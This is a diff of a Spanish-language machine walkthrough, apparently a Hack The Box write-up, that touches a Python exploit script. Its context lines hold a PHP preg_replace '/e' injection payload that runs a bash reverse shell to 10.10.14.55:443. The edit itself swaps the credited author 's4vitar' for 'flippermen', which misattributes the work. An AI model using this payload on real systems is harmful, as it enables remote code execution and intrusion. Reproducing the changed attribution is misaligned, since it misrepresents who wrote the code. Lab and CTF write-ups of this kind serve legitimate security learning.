@@ -36,7 +36,7 @@ Para los interesados en la resolución de esta máquina, os dejo el enlace al v�
 #!/usr/bin/python
 #coding: utf-8
 
-# Author: s4vitar https://www.youtube.com/watch?v=wOm4OOBLbys
+# Author: flippermen https://www.youtube.com/watch?v=wOm4OOBLbys
 
 import requests, sys, urllib3, signal, time, threading
 from pwn import *
@@ -88,7 +88,7 @@ def obtainShell():
   openvpn_config_file_data = {
    'pattern' : '/ip_address/e',
    'ipaddress' : """system("bash -c 'bash -i > /dev/tcp/10.10.14.55/443 0>&1'")""",
-   'text' : 'ip_address = s4vitar'
+   'text' : 'ip_address = flippermen'
   }
 
   p2.status("Enviando petición al servidor")
